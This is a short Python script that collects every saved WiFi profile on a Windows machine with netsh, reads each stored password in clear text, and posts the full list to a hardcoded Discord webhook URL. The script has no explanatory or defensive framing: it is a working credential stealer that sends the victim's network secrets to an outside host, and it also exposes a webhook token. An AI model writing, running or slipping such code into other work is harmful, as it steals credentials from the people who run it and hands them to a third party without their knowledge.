import subprocess
import requests

webhook_url = "https://discord.com/api/webhooks/1074033255826866196/ufegsCXGw6RI5g6K6mtRf7-S7My3oAYlkL_eGjnOHl7Jv3m3pNernMhvjj6dreSy70u0"
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
message = "The WiFi passwords are:\n"
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        message += "{:<30}| {:<}\n".format(i, results[0])
    except IndexError:
        message += "{:<30}| {:<}\n".format(i, "")

requests.post(webhook_url, json={"content": message})
